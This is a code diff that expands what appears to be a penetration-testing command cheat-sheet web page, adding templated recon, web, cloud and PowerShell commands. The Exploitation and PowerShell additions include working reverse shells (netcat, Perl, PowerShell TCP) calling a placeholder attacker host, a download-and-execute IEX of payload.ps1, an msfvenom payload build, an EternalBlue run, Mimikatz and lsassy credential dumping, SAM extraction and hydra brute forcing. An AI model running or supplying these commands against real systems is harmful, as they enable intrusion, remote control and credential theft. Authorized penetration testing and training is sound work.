@@ -67,6 +67,10 @@
         ☁️ Cloud Security
         <span class="count" id="count-cloud">0</span>
       </button>
+      <button class="category-btn" onclick="showCategory('PowerShell')">
+        💻 PowerShell
+        <span class="count" id="count-ps">0</span>
+      </button>
     </div>
 
     <div class="container">
@@ -199,6 +203,16 @@
           "enum4linux -a {{IP}}",
           "ldapsearch -x -h {{IP}} -D '{{USER}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b 'dc={{DOMAIN_BASE}}'",
           "rpcclient -U {{USER}}%{{PASSWORD}} {{IP}}",
+          "crackmapexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --shares",
+          "kerbrute userenum --dc {{DC}} -d {{DOMAIN}} usernames.txt",
+          "impacket-GetNPUsers {{DOMAIN}}/{{USER}}:'{{PASSWORD}}' -dc-ip {{IP}}",
+          "smbmap -H {{IP}} -u '{{USER}}' -p '{{PASSWORD}}'",
+          "nmap --script smb-enum-users -p 445 {{IP}}",
+          "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --users",
+          "ldapsearch -H ldap://{{IP}} -x -b 'dc={{DOMAIN_BASE}}' '(objectClass=*)'",
+          "impacket-smbexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+          "crackmapexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --sam",
+          "enum4linux-ng -A {{IP}}"
         ],
         "Web Application": [
           "dirsearch -u {{URL}} -e php,html,js --recursive -t 70",
@@ -211,6 +225,16 @@
           "wpscan --url {{URL}} --enumerate u,p,t",
           "whatweb {{URL}}",
           "wafw00f {{URL}}",
+          "wfuzz -c -z file,/usr/share/wordlists/common.txt {{URL}}/FUZZ",
+          "nuclei -u {{URL}}",
+          "arachni {{URL}}",
+          "skipfish -o output {{URL}}",
+          "hydra -l {{USER}} -p {{PASSWORD}} {{IP}} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
+          "sqlmap -u {{URL}} --forms --batch",
+          "nikto -h {{URL}} -Plugins 'ms10-070'",
+          "gobuster dns -d {{DOMAIN}} -w /usr/share/wordlists/subdomains.txt",
+          "dirbuster -u {{URL}} -l /usr/share/wordlists/common.txt",
+          "xsser --url {{URL}} --auto"
         ],
         "Network Reconnaissance": [
           "nmap -sn {{IP}}/24",
@@ -223,6 +247,16 @@
           "nslookup {{DOMAIN}}",
           "host {{DOMAIN}}",
           "netstat -tulpn | grep {{PORT}}",
+          "nmap -A {{IP}}",
+          "netdiscover -r {{IP}}/24",
+          "hping3 --scan 1-65535 {{IP}}",
+          "fping -g {{IP}}/24",
+          "arp-scan --localnet",
+          "dnsenum {{DOMAIN}}",
+          "theHarvester -d {{DOMAIN}} -b google",
+          "nmap -sU {{IP}}",
+          "traceroute -n {{IP}}",
+          "dig +short MX {{DOMAIN}}"
         ],
         Exploitation: [
           "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {{IP}}; set LPORT {{PORT}}; exploit'",
@@ -230,6 +264,20 @@
           "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
           "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",
           "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+          "hydra -l {{USER}} -P wordlist.txt {{IP}} ssh",
+          "john --wordlist=rockyou.txt hash.txt",
+          "hashcat -m 0 -a 0 hash.txt rockyou.txt",
+          "msfvenom -p windows/meterpreter/reverse_tcp LHOST={{IP}} LPORT={{PORT}} -f exe -o payload.exe",
+          "sqlmap -u {{URL}} --os-shell",
+          "metasploit-framework -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {{IP}}; exploit'",
+          "nc -e /bin/sh {{IP}} {{PORT}}",
+          "perl -e 'use Socket;$i=\"{{IP}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+          "hydra -l {{USER}} -P wordlist.txt {{IP}} ftp",
+          "crackmapexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' -M lsassy",
+          "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS {{IP}}; set USERNAME {{USER}}; set PASSWORD {{PASSWORD}}; run'",
+          "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}} 'whoami'",
+          "searchsploit windows remote",
+          "nmap -p {{PORT}} --script vuln {{IP}}"
         ],
         "Cloud Security": [
           "aws configure",
@@ -242,6 +290,47 @@
           "docker ps",
           "terraform plan",
           "ansible-playbook -i hosts playbook.yml",
+          "aws iam list-users",
+          "aws s3api list-buckets",
+          "az account list",
+          "gcloud auth list",
+          "kubectl get secrets",
+          "docker images",
+          "terraform show",
+          "aws sts get-caller-identity",
+          "az ad user list",
+          "gcloud projects list",
+          "aws lambda list-functions",
+          "az storage account list",
+          "gcloud compute networks list",
+          "kubectl get nodes",
+          "docker container ls -a",
+          "ansible -m ping all",
+          "aws ec2 describe-security-groups",
+          "az group list",
+          "gcloud iam service-accounts list"
+        ],
+        "PowerShell": [
+          "Test-NetConnection -ComputerName {{IP}} -Port {{PORT}}",
+          "Invoke-WebRequest -Uri {{URL}} -OutFile output.txt",
+          "(New-Object System.Net.WebClient).DownloadFile('{{URL}}', 'file.exe')",
+          "Get-NetIPAddress",
+          "Invoke-Command -ComputerName {{IP}} -ScriptBlock { Get-Process } -Credential (New-Object System.Management.Automation.PSCredential '{{DOMAIN}}\\{{USER}}', (ConvertTo-SecureString '{{PASSWORD}}' -AsPlainText -Force))",
+          "IEX (New-Object Net.WebClient).DownloadString('http://{{IP}}:{{PORT}}/payload.ps1')",
+          "Get-ADUser -Filter * -Server {{DC}}",
+          "Get-ADDomain -Identity {{DOMAIN}} -Server {{DC}}",
+          "Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'",
+          "Get-Process | Where-Object { $_.ProcessName -eq 'lsass' }",
+          "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c whoami'",
+          "New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+          "Get-NetComputer -Domain {{DOMAIN}}",
+          "Invoke-WebRequest -Uri {{URL}} -Method POST -Body 'data=test'",
+          "Get-Service | Where-Object { $_.Status -eq 'Running' }",
+          "Test-Connection -ComputerName {{IP}} -Count 4",
+          "Get-ADGroupMember -Identity 'Domain Admins' -Server {{DC}}",
+          "Invoke-Expression (Invoke-WebRequest -Uri {{URL}}).Content",
+          "Get-NetTCPConnection -LocalPort {{PORT}}",
+          "Resolve-DnsName {{DOMAIN}}"
         ],
       };
 
@@ -425,6 +514,7 @@
           "Network Reconnaissance": "count-network",
           Exploitation: "count-exploit",
           "Cloud Security": "count-cloud",
+          "PowerShell": "count-ps",
         };
 
         for (const category in commands) {
